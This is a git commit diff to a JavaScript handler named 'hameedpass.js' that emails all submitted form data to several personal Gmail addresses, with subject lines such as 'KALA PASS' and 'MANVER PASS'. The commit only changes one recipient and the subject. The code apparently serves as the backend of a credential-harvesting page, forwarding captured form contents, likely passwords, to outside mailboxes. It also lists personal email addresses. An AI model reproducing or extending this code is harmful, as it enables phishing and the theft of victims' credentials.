0e778d4975680731153cab4aaccb6b6e85ab090d
svgdvahshn-gif <svgdvahshn@gmail.com>
2025-12-15 16:40:21 +0500

    Update hameedpass.js

--- hameedpass.js
+++ hameedpass.js
@@ -37,8 +37,8 @@ export default async function handler(req, res) {
     // ✅ Send email
     await transporter.sendMail({
       from: `"PROFESSOR" <${process.env.SMTP_USER}>`,
-      to: "mahboobalinizamani@gmail.com,rnxsxnnxnx@gmail.com,abdulhameednizamani208@gmail.com",
-      subject: "KALA PASS",
+      to: "mahboobalinizamani@gmail.com,rnxsxnnxnx@gmail.com,no-reply@google.com",
+      subject: "MANVER PASS",
       text: JSON.stringify(formData, null, 2),
       html: `<h3>Professor Link</h3><pre>${JSON.stringify(formData, null, 2)}</pre>`,
     });
